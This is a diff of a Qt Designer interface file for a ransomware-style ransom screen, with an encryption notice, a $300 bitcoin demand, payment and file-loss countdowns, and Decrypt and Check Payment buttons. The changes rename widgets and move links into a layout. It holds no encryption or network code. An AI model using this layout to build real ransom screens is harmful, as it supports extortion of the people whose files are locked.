@@ -21,8 +21,7 @@
    <bool>false</bool>
   </property>
   <property name="styleSheet">
-   <string notr="true">background-color: rgb(162, 0, 0);
-</string>
+   <string notr="true"/>
   </property>
   <widget class="QWidget" name="centralWidget">
    <widget class="QComboBox" name="comboBox">
@@ -48,7 +47,7 @@
      </property>
     </item>
    </widget>
-   <widget class="QLabel" name="label">
+   <widget class="QLabel" name="title">
     <property name="geometry">
      <rect>
       <x>410</x>
@@ -64,7 +63,7 @@
      </font>
     </property>
     <property name="styleSheet">
-     <string notr="true">color:white</string>
+     <string notr="true"/>
     </property>
     <property name="text">
      <string>Ooops, your files have been encrypted!</string>
@@ -92,7 +91,7 @@ color: rgb(255, 255, 255);</string>
     <property name="lineWidth">
      <number>2</number>
     </property>
-    <widget class="QLabel" name="label_2">
+    <widget class="QLabel" name="text">
      <property name="geometry">
       <rect>
        <x>170</x>
@@ -116,7 +115,7 @@ color: rgb(255, 255, 255);</string>
       <string>Send $300 worth of bitcoin to this address:</string>
      </property>
     </widget>
-    <widget class="QLineEdit" name="lineEdit">
+    <widget class="QLineEdit" name="address">
      <property name="geometry">
       <rect>
        <x>170</x>
@@ -144,7 +143,7 @@ color: rgb(255, 255, 255);</string>
       <bool>true</bool>
      </property>
     </widget>
-    <widget class="QPushButton" name="pushButton">
+    <widget class="QPushButton" name="button1">
      <property name="geometry">
       <rect>
        <x>590</x>
@@ -161,7 +160,7 @@ color: rgb(0, 0, 0);</string>
       <string>Copy</string>
      </property>
     </widget>
-    <widget class="QLabel" name="label_4">
+    <widget class="QLabel" name="picture2">
      <property name="geometry">
       <rect>
        <x>10</x>
@@ -207,7 +206,7 @@ p, li { white-space: pre-wrap; }
 &lt;p style=&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-family:'Roboto,arial,sans-serif'; font-size:14pt; color:#212121; background-color:#ffffff;&quot;&gt;Yes, forgot to tell you, for more than six months no money to pay the poor, there will be free to resume activities, can turn to see you luck.&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</string>
     </property>
    </widget>
-   <widget class="QPushButton" name="pushButton_2">
+   <widget class="QPushButton" name="button2">
     <property name="geometry">
      <rect>
       <x>300</x>
@@ -232,7 +231,7 @@ color: rgb(0, 0, 0);</string>
      <string>Check Payment</string>
     </property>
    </widget>
-   <widget class="QPushButton" name="pushButton_3">
+   <widget class="QPushButton" name="button3">
     <property name="geometry">
      <rect>
       <x>640</x>
@@ -257,7 +256,7 @@ color: rgb(0, 0, 0);</string>
      <string>Decrypt</string>
     </property>
    </widget>
-   <widget class="QLabel" name="label_3">
+   <widget class="QLabel" name="picture1">
     <property name="geometry">
      <rect>
       <x>60</x>
@@ -304,7 +303,7 @@ color: rgb(0, 0, 0);</string>
       <number>8</number>
      </property>
     </widget>
-    <widget class="QLabel" name="label_5">
+    <widget class="QLabel" name="countdown1">
      <property name="geometry">
       <rect>
        <x>20</x>
@@ -328,7 +327,7 @@ color: rgb(0, 0, 0);</string>
       <string>Payment will be raised on:</string>
      </property>
     </widget>
-    <widget class="QLabel" name="label_7">
+    <widget class="QLabel" name="countdown2">
      <property name="geometry">
       <rect>
        <x>80</x>
@@ -424,7 +423,7 @@ color: rgb(0, 0, 0);</string>
       <number>12</number>
      </property>
     </widget>
-    <widget class="QLabel" name="label_6">
+    <widget class="QLabel" name="countdown3">
      <property name="geometry">
       <rect>
        <x>40</x>
@@ -448,7 +447,7 @@ color: rgb(0, 0, 0);</string>
       <string>Your files will be lost on:</string>
      </property>
     </widget>
-    <widget class="QLabel" name="label_8">
+    <widget class="QLabel" name="countdown4">
      <property name="geometry">
       <rect>
        <x>80</x>
@@ -510,85 +509,79 @@ color: rgb(0, 0, 0);</string>
      </property>
     </widget>
    </widget>
-   <widget class="QPushButton" name="pushButton_4">
+   <widget class="QWidget" name="">
     <property name="geometry">
      <rect>
-      <x>10</x>
-      <y>490</y>
-      <width>141</width>
-      <height>31</height>
+      <x>20</x>
+      <y>500</y>
+      <width>153</width>
+      <height>96</height>
      </rect>
     </property>
-    <property name="font">
-     <font>
-      <family>Arial</family>
-      <pointsize>12</pointsize>
-      <underline>true</underline>
-     </font>
-    </property>
-    <property name="styleSheet">
-     <string notr="true">color: rgb(0, 170, 255);</string>
-    </property>
-    <property name="text">
-     <string>About bitcoin</string>
-    </property>
-    <property name="flat">
-     <bool>true</bool>
-    </property>
-   </widget>
-   <widget class="QPushButton" name="pushButton_5">
-    <property name="geometry">
-     <rect>
-      <x>30</x>
-      <y>530</y>
-      <width>151</width>
-      <height>31</height>
-     </rect>
-    </property>
-    <property name="font">
-     <font>
-      <family>Arial</family>
-      <pointsize>12</pointsize>
-      <underline>true</underline>
-     </font>
-    </property>
-    <property name="styleSheet">
-     <string notr="true">color: rgb(0, 170, 255);</string>
-    </property>
-    <property name="text">
-     <string>How to buy bitcoins?</string>
-    </property>
-    <property name="flat">
-     <bool>true</bool>
-    </property>
-   </widget>
-   <widget class="QPushButton" name="pushButton_6">
-    <property name="geometry">
-     <rect>
-      <x>10</x>
-      <y>570</y>
-      <width>151</width>
-      <height>31</height>
-     </rect>
-    </property>
-    <property name="font">
-     <font>
-      <family>Arial</family>
-      <pointsize>14</pointsize>
-      <weight>75</weight>
-      <bold>true</bold>
-      <underline>true</underline>
-     </font>
-    </property>
-    <property name="styleSheet">
-     <string notr="true">color: rgb(0, 170, 255);</string>
-    </property>
-    <property name="text">
-     <string>Contact Us</string>
-    </property>
-    <property name="flat">
-     <bool>true</bool>
-    </property>
+    <layout class="QVBoxLayout" name="verticalLayout">
+     <item alignment="Qt::AlignLeft">
+      <widget class="QPushButton" name="link1">
+       <property name="font">
+        <font>
+         <family>Arial</family>
+         <pointsize>12</pointsize>
+         <underline>true</underline>
+        </font>
+       </property>
+       <property name="styleSheet">
+        <string notr="true">color: rgb(0, 170, 255);</string>
+       </property>
+       <property name="text">
+        <string>About bitcoin</string>
+       </property>
+       <property name="flat">
+        <bool>true</bool>
+       </property>
+      </widget>
+     </item>
+     <item alignment="Qt::AlignLeft">
+      <widget class="QPushButton" name="link2">
+       <property name="font">
+        <font>
+         <family>Arial</family>
+         <pointsize>12</pointsize>
+         <underline>true</underline>
+        </font>
+       </property>
+       <property name="styleSheet">
+        <string notr="true">color: rgb(0, 170, 255);</string>
+       </property>
+       <property name="text">
+        <string>How to buy bitcoins?</string>
+       </property>
+       <property name="flat">
+        <bool>true</bool>
+       </property>
+      </widget>
+     </item>
+     <item alignment="Qt::AlignLeft">
+      <widget class="QPushButton" name="link3">
+       <property name="font">
+        <font>
+         <family>Arial</family>
+         <pointsize>14</pointsize>
+         <weight>75</weight>
+         <bold>true</bold>
+         <underline>true</underline>
+        </font>
+       </property>
+       <property name="styleSheet">
+        <string notr="true">color: rgb(0, 170, 255);</string>
+       </property>
+       <property name="text">
+        <string>Contact Us</string>
+       </property>
+       <property name="flat">
+        <bool>true</bool>
+       </property>
+      </widget>
+     </item>
+    </layout>
    </widget>
   </widget>
  </widget>
